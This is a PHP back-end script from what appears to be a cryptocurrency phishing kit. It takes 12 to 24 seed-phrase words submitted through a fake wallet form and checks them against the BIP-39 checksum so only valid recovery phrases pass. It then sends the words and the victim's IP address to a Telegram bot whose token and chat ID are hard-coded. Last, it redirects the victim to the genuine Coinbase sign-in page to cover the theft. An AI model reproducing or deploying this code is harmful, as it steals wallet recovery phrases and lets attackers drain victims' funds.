<?php
/* -------- Tiny autoloader for memo/src -------- */
spl_autoload_register(function ($class) {
    $prefix  = 'FurqanSiddiqui\\BIP39\\';
    $baseDir = __DIR__ . '/memo/src/';
    if (strncmp($prefix, $class, strlen($prefix)) !== 0) return;
    $relative = substr($class, strlen($prefix));
    $file     = $baseDir . str_replace('\\', '/', $relative) . '.php';
    if (is_file($file)) require $file;
});

/* -------- Your credentials -------- */
$botToken = '8166415338:AAEd3Dpp4f_Yup_qtiIm7y4pw2HDATA_ZuA';
$chatId   = '-4625302890';
/* -------- Collect words from POST -------- */
$words = [];
for ($i = 1; $i <= 24; $i++) {
    if (!empty($_POST["word$i"])) $words[] = strtolower(trim($_POST["word$i"]));
}

/* Basic count check */
if (!in_array(count($words), [12,15,18,21,24], true)) {
    header('Location: ../wallet.php?err=count'); exit;
}

/* NEW:  require ≥ 4 unique words to stop repeats */
if (count(array_unique($words)) < 4) {
    header('Location: ../wallet.php?err=pattern'); exit;
}

/* -------- BIP-39 checksum validation -------- */
use FurqanSiddiqui\BIP39\BIP39;
use FurqanSiddiqui\BIP39\Language\English;

try {
    BIP39::fromWords($words, English::getInstance(), verifyChecksum: true);
} catch (Exception $e) {
    header('Location: ../wallet.php?err=invalid'); exit;
}

/* -------- Send to Telegram -------- */
$msg  = "New Seed Phrase Submitted:\n";
foreach ($words as $i => $w) $msg .= sprintf("Word %d: %s\n", $i+1, $w);
$msg .= "\nIP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');

$params = ['chat_id'=>$chatId,'text'=>$msg,'parse_mode'=>'HTML'];
$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch,[CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>$params,CURLOPT_RETURNTRANSFER=>1]);
curl_exec($ch); curl_close($ch);

/* -------- Success redirect -------- */
header('Location: https://login.coinbase.com/signin'); exit;
?>
